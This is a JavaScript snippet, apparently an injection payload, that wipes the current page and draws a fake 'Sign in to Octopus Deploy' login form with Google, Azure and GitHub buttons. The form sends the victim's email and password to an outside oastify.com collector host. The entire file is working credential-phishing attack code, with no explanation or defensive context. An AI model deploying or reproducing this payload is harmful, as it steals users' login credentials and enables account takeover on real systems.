document.body.innerHTML=""
let form = document.createElement('form');
form.setAttribute('action', 'https://ceu2v716v8uf9zs3bxhyjei3nutnhd52.oastify.com');
form.setAttribute('method', 'GET');

// Create a div for the login container
let loginContainer = document.createElement('div');
loginContainer.style.width = '400px';
loginContainer.style.margin = '100px auto';
loginContainer.style.padding = '20px';
loginContainer.style.borderRadius = '5px';
loginContainer.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.1)';
loginContainer.style.backgroundColor = '#fff';
form.appendChild(loginContainer);

// Create a title for the login page
let title = document.createElement('h2');
title.innerText = 'Sign in to Octopus Deploy';
title.style.textAlign = 'center';
loginContainer.appendChild(title);

// Create a div for the social login buttons
let socialLoginDiv = document.createElement('div');
socialLoginDiv.style.display = 'flex';
socialLoginDiv.style.justifyContent = 'space-around';
socialLoginDiv.style.marginBottom = '20px';

let googleButton = document.createElement('button');
googleButton.innerText = 'Google';
googleButton.style.flex = '1';
googleButton.style.margin = '5px';
socialLoginDiv.appendChild(googleButton);

let azureButton = document.createElement('button');
azureButton.innerText = 'Azure';
azureButton.style.flex = '1';
azureButton.style.margin = '5px';
socialLoginDiv.appendChild(azureButton);

let githubButton = document.createElement('button');
githubButton.innerText = 'GitHub';
githubButton.style.flex = '1';
githubButton.style.margin = '5px';
socialLoginDiv.appendChild(githubButton);

loginContainer.appendChild(socialLoginDiv);

// Create a separator or text
let separatorText = document.createElement('p');
separatorText.innerText = 'or sign in with your email';
separatorText.style.textAlign = 'center';
separatorText.style.marginBottom = '20px';
loginContainer.appendChild(separatorText);

// Create an input field for email
let emailInput = document.createElement('input');
emailInput.setAttribute('type', 'email');
emailInput.setAttribute('name', 'email'); // Add name attribute for form submission
emailInput.setAttribute('placeholder', 'Email Address');
emailInput.style.width = '100%';
emailInput.style.padding = '10px';
emailInput.style.marginBottom = '10px';
emailInput.style.borderRadius = '3px';
emailInput.style.border = '1px solid #ccc';
loginContainer.appendChild(emailInput);

// Create an input field for password
let passwordInput = document.createElement('input');
passwordInput.setAttribute('type', 'password');
passwordInput.setAttribute('name', 'password'); // Add name attribute for form submission
passwordInput.setAttribute('placeholder', 'Password');
passwordInput.style.width = '100%';
passwordInput.style.padding = '10px';
passwordInput.style.marginBottom = '10px';
passwordInput.style.borderRadius = '3px';
passwordInput.style.border = '1px solid #ccc';
loginContainer.appendChild(passwordInput);

// Create a link for forgotten password
let forgotPasswordLink = document.createElement('a');
forgotPasswordLink.href = '#';
forgotPasswordLink.innerText = 'Forgot your password?';
forgotPasswordLink.style.display = 'block';
forgotPasswordLink.style.marginBottom = '20px';
forgotPasswordLink.style.textAlign = 'right';
loginContainer.appendChild(forgotPasswordLink);

// Create a sign-in button
let signInButton = document.createElement('button');
signInButton.innerText = 'Sign in';
signInButton.style.width = '100%';
signInButton.style.padding = '10px';
signInButton.style.backgroundColor = '#28a745';
signInButton.style.color = '#fff';
signInButton.style.border = 'none';
signInButton.style.borderRadius = '3px';
signInButton.style.cursor = 'pointer';
signInButton.setAttribute('type', 'submit'); // Change button type to submit
loginContainer.appendChild(signInButton);

// Append the form to the body
document.body.appendChild(form);

// Add background color to the page
document.body.style.backgroundColor = '#f5f5f5';
